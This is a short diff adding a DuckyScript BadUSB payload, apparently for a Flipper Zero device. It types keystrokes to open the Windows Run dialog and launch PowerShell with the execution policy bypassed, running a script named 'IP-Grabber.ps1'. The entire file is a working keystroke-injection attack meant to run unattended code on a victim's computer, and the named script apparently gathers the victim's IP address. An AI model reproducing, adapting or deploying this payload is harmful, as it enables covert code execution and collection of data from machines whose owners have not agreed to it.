@@ -1,0 +1,5 @@
+DELAY 500 
+GUI r
+DELAY 500
+STRING powershell -NoP -Ep Bypass -File "SD Card/badusb/Flip-IP-Grabber/IP-Grabber.ps1"; PAUSE
+ENTER
